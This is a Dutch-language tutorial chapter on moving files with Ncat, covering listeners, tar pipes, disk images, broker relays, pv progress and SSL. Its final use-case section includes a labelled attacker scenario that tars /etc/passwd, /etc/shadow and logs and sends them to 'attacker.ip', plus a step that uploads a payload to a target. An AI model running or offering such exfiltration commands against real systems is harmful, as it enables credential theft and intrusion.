## 📁 Waarom Ncat Voor File Transfers?

In veel scenarios zijn standaard file transfer methods niet beschikbaar:
- ❌ File te groot voor email
- ❌ Geen internet connectie tussen machines
- ❌ Geen FTP/SMB/NFS setup beschikbaar
- ❌ Air-gapped systemen

**Ncat biedt:**
- ✅ **Simple raw network pipe**
- ✅ **Geen configuratie** nodig
- ✅ **Werkt over TCP/UDP**
- ✅ **Optionele encryption** (`--ssl`)

::caution
**Zonder encryption** kan iedereen op het netwerk jouw files intercepten. Zie [hoofdstuk 5 — Encryption](./5.encryption.md) voor `--ssl` usage.
::

## 📤 Basic File Transfer — Twee Methoden

Er zijn **twee manieren** om files te transferren:
1. **Receiver luistert** (sender connects)
2. **Sender luistert** (receiver connects)

Beide methoden werken identiek — kies wat past bij je netwerk setup.

---

### Methode 1: Receiver Luistert

**Host2 (receiver):**
```bash
ncat -l 31337 > outputfile
```

**Host1 (sender):**
```bash
ncat --send-only host2 31337 < inputfile
```

**Workflow:**
1. Receiver start listener op poort 31337
2. Sender connect en stuurt file
3. `--send-only` zorgt dat sender quit wanneer file verstuurd is

::note
**Default behavior:** Ncat blijft open na end-of-input (wacht op response). `--send-only` forceert close na file upload.
::

---

### Methode 2: Sender Luistert

**Host1 (sender):**
```bash
ncat -l --send-only 31337 < inputfile
```

**Host2 (receiver):**
```bash
ncat host1 31337 > outputfile
```

**Workflow:**
1. Sender start listener met file
2. Receiver connect en download
3. Sender quit automatisch na verzenden

::tip
**Wanneer gebruiken:** Sender luistert wanneer receiver **geen listening port** kan openen (firewall, NAT).
::

## 📦 Tar Bundles — Meerdere Files Tegelijk

In plaats van één file per keer, kun je **meerdere files bundelen** met `tar` en direct over ncat pipen:

### Met Compression

**Receiver (luistert):**
```bash
ncat -l 31337 | tar xzv
```

**Sender:**
```bash
tar czv <files> | ncat --send-only host2 31337
```

**Wat er gebeurt:**
1. `tar czv` — Compress files naar gzip tar archive
2. Pipe naar `ncat` — Stuurt compressed stream
3. Receiver untars direct — Files extracted on-the-fly

::tip
**Geen tijdelijke files!** De stream gaat direct van tar naar netwerk naar untar — ideaal wanneer disk space beperkt is.
::

---

### Zonder Compression (sneller)

```bash
# Receiver:
ncat -l 31337 | tar xv

# Sender:
tar cv <files> | ncat --send-only host2 31337
```

**Wanneer geen compression:**
- ✅ Snellere transfer (geen CPU overhead)
- ✅ Files zijn al gecomprimeerd (video, images)
- ⚠️ Grotere network usage

## 💽 Disk Images Transferren

Je kunt **hele disks** over ncat transferren — handig voor:
- Forensic imaging
- Backup van unmounted disks
- VM disk migration

### Basic Disk Image

**Receiver:**
```bash
ncat -l 31337 > host1-sda.image
```

**Sender:**
```bash
ncat --send-only host2 31337 < /dev/sda
```

::warning
**Disk moet unmounted of read-only** zijn om consistent image te maken!
::

---

### Met On-the-Fly Compression

**Receiver:**
```bash
ncat -l 31337 | bzip2 -d > host1-sda.image
```

**Sender:**
```bash
cat /dev/sda | bzip2 | ncat --send-only host2 31337
```

**Performance overwegingen:**
- **Snelheid netwerk vs CPU** — compression helpt alleen als network langzamer is dan CPU
- **Bzip2** — Betere compression dan gzip, maar langzamer
- **Gzip** — Sneller, minder compression

## 🔄 File Transfer Via Intermediary (Relay)

Wanneer **twee hosts elkaar niet direct kunnen bereiken** (beide achter NAT/firewall), gebruik een **third host als relay**:

```
Host1 (sender) ──► Host3 (broker) ◄── Host2 (receiver)
```

**Host3 (broker/intermediary):**
```bash
ncat -l --broker 31337
```

**Host2 (receiver - connects eerst!):**
```bash
ncat host3 31337 > outputfile
```

**Host1 (sender):**
```bash
ncat --send-only host3 31337 < inputfile
```

::important
**Volgorde matters:**
1. Broker start eerst
2. **Receiver connect** (anders mist data)
3. Sender connect en upload
4. Receiver moet **manual disconnect** (Ctrl+C) — broker quit nooit automatisch
::

**Hoe het werkt:**
- Broker buffert **niets** — stuurt direct door naar connected clients
- Data van sender → broker → receiver (real-time relay)

## 📊 Progress Monitoring

Ncat heeft **geen built-in progress indicator**. Use `pv` (Pipe Viewer) voor progress:

### Installeer pv

```bash
sudo apt install pv -y
```

### File Transfer Met Progress

**Sender:**
```bash
pv inputfile | ncat --send-only host2 31337
```

**Output:**
```
2.5GiB 0:03:45 [11.3MiB/s] [=========>          ] 45% ETA 0:04:15
```

**Receiver:**
```bash
ncat -l 31337 | pv > outputfile
```

::tip
`pv` toont:
- Bytes transferred
- Transfer rate
- Progress bar
- ETA
::

## 🔐 Encrypted File Transfers

**Basic ncat transfers zijn unencrypted** — iedereen op netwerk kan files lezen.

### SSL/TLS Encryption

**Receiver (SSL listener):**
```bash
ncat -l --ssl --ssl-cert server.pem --ssl-key server.key 31337 > file
```

**Sender (SSL client):**
```bash
ncat --ssl --send-only host2 31337 < file
```

::note
Voor complete SSL/TLS setup, zie [hoofdstuk 5 — Encryption](./5.encryption.md).
::

## 🎯 Use Cases & Scenarios

### Scenario 1: Exfiltrate Data Van Compromised Host

```bash
# Attacker (listener):
ncat -l 4444 | tar xzv

# Target (exfiltrate /etc/passwd, /etc/shadow, logs):
tar czv /etc/passwd /etc/shadow /var/log/ | ncat attacker.ip 4444
```

### Scenario 2: Upload Payload Naar Target

```bash
# Target (listener):
ncat -l 4444 > payload.exe

# Attacker (upload):
ncat --send-only target.ip 4444 < payload.exe
```

### Scenario 3: Backup Via Firewall (outbound only)

```bash
# Backup server (luistert op 443 = HTTPS port):
ncat -l 443 > backup.tar.gz

# Server achter firewall (outbound allowed):
tar czv /var/www/ | ncat backup-server.com 443
```
